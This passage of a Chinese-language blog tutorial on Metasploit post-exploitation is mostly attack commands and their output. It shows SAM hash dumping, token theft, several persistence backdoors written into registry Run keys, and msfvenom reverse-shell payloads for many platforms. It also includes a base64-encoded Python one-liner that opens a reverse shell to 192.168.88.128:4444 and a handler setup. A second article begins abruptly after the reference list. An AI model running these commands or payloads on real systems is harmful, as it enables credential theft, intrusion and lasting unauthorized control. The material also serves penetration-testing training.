Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

<p>4.powerdump<br>同 hashdump，但失败了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure>

<h3 id="4-7-假冒令牌"><a href="#4-7-假冒令牌" class="headerlink" title="4.7 假冒令牌"></a>4.7 假冒令牌</h3><p>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。</p>
<p>msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognito假冒令牌</span><br><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br><span class="line"></span><br><span class="line"># 2.steal_token窃取令牌</span><br><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure>

<h3 id="4-8-植入后门"><a href="#4-8-植入后门" class="headerlink" title="4.8 植入后门"></a>4.8 植入后门</h3><p>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。</p>
<p>1.persistence启动项后门</p>
<p>路径：metasploit/scripts/meterpreter/persistence</p>
<p>原理是在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本，在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项，<strong>很容易被杀软拦截，官方不推荐</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure>

<p>能实现同样功能的脚本还有：exploit/windows/local/persistence</p>
<p>2.metsvc服务后门</p>
<p>在C:\Users<em><strong>\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。</strong>通过服务启动，需要管理员权限，官方不推荐使用，运行失败</em>*</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –A   #自动安装后门</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run metsvc –A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure>

<p>三个文件上传成功，但服务没有启动起来，失败了。使用<code>-r</code>参数可卸载服务。</p>
<p>3.persistence_exe</p>
<p>再来看看官方推荐的东西吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure>

<p>此模块将可执行文件上载到远程主机并进行创建持久性。<br>涉及到四个参数</p>
<ul>
<li>REXENAME是拷贝到目标系统中的名字</li>
<li>EXEPATH是将要上传的后门在本地的位置</li>
<li>SESSION是选择运行此模块的会话</li>
<li>STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。</li>
</ul>
<p>尝试一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure>

<p>4.registry_persistence</p>
<p>完整路径为exploit/windows/local/registry_persistence</p>
<p>和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure>

<p>同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164525">萌新科普 手把手教你如何用MSF进行后渗透测试 - 安全客，安全资讯平台</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/118714.html">访问的文章审核中… - FreeBuf网络安全行业门户</a>## 1. 安装运行及初始化安装<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># 安装完成后位置</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># 目录结构 </span><br><span class="line">--modules 重点看这里就行了</span><br><span class="line">  --auxiliary 主要包含辅助性脚本(扫描、嗅探、注入、爆破，漏洞挖掘)</span><br><span class="line">  --encoders 主要包含各种编码工具，以便绕过入侵检测和过滤系统</span><br><span class="line">  --exploits 漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统/服务/模块</span><br><span class="line">  --nops 绕过针对溢出攻击滑行字符串的拦截检测</span><br><span class="line">  --payloads 攻击荷载，主要在目标机器执行代码</span><br><span class="line">  --post 此目录放着msf的exploit执行成功后，向目标发送的一些功能性指令，如提权，获取hash等</span><br><span class="line">  --evasion 新增，用来生成免杀payload，类似于集成msfvenom功能</span><br><span class="line">--data 放了meterpreter ，passiveX，vnc，DLLs，等这些工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件</span><br><span class="line">--plugins 这里的模块用户需要load来加载，提供数据库连接插件和各种要用到的插件</span><br><span class="line">--scripts 这个目录下的文件大都是meterpreter这个模块利用的脚本，比如用到migrate来转移到其他进程的指令的源代码就在此</span><br><span class="line">--tools 包含一些有用的脚本和零散的工具</span><br></pre></td></tr></table></figure>

启动<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 运行</span><br><span class="line">$ msfconsole</span><br><span class="line"># 初始化数据库</span><br><span class="line">$ msfdb init</span><br><span class="line"># 重建缓存</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># 查看数据库连接情况</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure>

<h2 id="2-msf基本命令-1"><a href="#2-msf基本命令-1" class="headerlink" title="2. msf基本命令"></a>2. msf基本命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits – 查看所有可用的渗透攻击程序代码 </span><br><span class="line">show auxiliary – 查看所有可用的辅助攻击工具 </span><br><span class="line">show options – 查看该模块所有可用选项 </span><br><span class="line">show payloads – 查看该模块适用的所有载荷代码 </span><br><span class="line">show targets – 查看该模块适用的攻击目标类型</span><br><span class="line">search – 根据关键字搜索某模块 </span><br><span class="line">info – 显示某模块的详细信息 </span><br><span class="line">use – 进入使用某渗透攻击模块 </span><br><span class="line">back – 回退 </span><br><span class="line">set/unset – 设置/禁用模块中的某个参数 </span><br><span class="line">setg/unsetg – 设置/禁用适用于所有模块的全局参数 </span><br><span class="line">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</span><br></pre></td></tr></table></figure>

<h2 id="3-msfvenom生成payload-1"><a href="#3-msfvenom生成payload-1" class="headerlink" title="3 msfvenom生成payload"></a>3 msfvenom生成payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</span><br><span class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</span><br><span class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</span><br><span class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</span><br><span class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</span><br><span class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</span><br><span class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</span><br><span class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">    --payload-options            列举payload的标准选项</span><br><span class="line">-o, --out   &lt;path&gt;               保存payload</span><br><span class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</span><br><span class="line">    --shellest                   最小化生成payload</span><br><span class="line">-h, --help                       查看帮助选项</span><br><span class="line">    --help-formats               查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>

1.可执行程序Linux<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">正向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

Windows<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

Mac<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>

执行方式：直接复制可执行程序到目标机器上执行就行了。2.Web PayloadsPHP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

ASP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

JSP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

WAR<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>

3.脚本shellPython<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

Bash<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>

Perl<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>

执行方式：复制shell.py中的内容在linux命令行下执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>

4.shellcode<br>Linux Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

Windows Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

Mac Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

<h2 id="4-Meterpreter基本命令-1"><a href="#4-Meterpreter基本命令-1" class="headerlink" title="4. Meterpreter基本命令"></a>4. Meterpreter基本命令</h2>首先需要先获取meterpreter：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</span><br><span class="line">jobs  # 查看后台攻击任务 </span><br><span class="line">kill &lt;id&gt;  # 停止某后台攻击任务 </span><br><span class="line">sessions -l  # (查看会话)</span><br><span class="line">sessions -i 2   # 选择会话</span><br><span class="line">sessions -k 2   # 结束会话</span><br></pre></td></tr></table></figure>

